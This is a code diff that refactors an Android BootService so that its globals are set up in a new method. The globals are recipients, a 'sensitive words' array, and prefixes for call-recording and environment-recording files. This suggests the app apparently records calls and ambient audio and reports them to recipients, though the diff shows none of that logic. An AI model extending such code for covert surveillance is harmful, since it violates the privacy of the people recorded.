@@ -216,17 +216,7 @@ public class BootService extends Service
 		
 		// ------------------------------------------------------------------
 		// Initialize global variables
-		if (GlobalValues.recipients == null || GlobalValues.recipients.length <= 0) 
-			GlobalValues.recipients = getRecipients(context);
-		
-		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
-			GlobalValues.sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
-		
-		if (GlobalValues.callRecordFilePrefix == null) 
-			GlobalValues.callRecordFilePrefix = context.getResources().getString(R.string.phonecall_record);
-		
-		if (GlobalValues.envRecordFilePrefix == null) 
-			GlobalValues.envRecordFilePrefix = context.getResources().getString(R.string.env_record);
+		initGlobalValues();
 			
 		// ------------------------------------------------------------------			
 		// Start timers and listeners
@@ -256,6 +246,21 @@ public class BootService extends Service
 		*/
 	}
 	
+	private void initGlobalValues() {
+		if (GlobalValues.recipients == null || GlobalValues.recipients.length <= 0) 
+			GlobalValues.recipients = getRecipients(context);
+		
+		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
+			GlobalValues.sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
+		
+		if (GlobalValues.callRecordFilePrefix == null) 
+			GlobalValues.callRecordFilePrefix = context.getResources().getString(R.string.phonecall_record);
+		
+		if (GlobalValues.envRecordFilePrefix == null) 
+			GlobalValues.envRecordFilePrefix = context.getResources().getString(R.string.env_record);
+		
+	}
+
 	/*
 	// Prevent me from being cheated when in trial
 	private void CheckDate(Context context, LICENSE_TYPE type) 
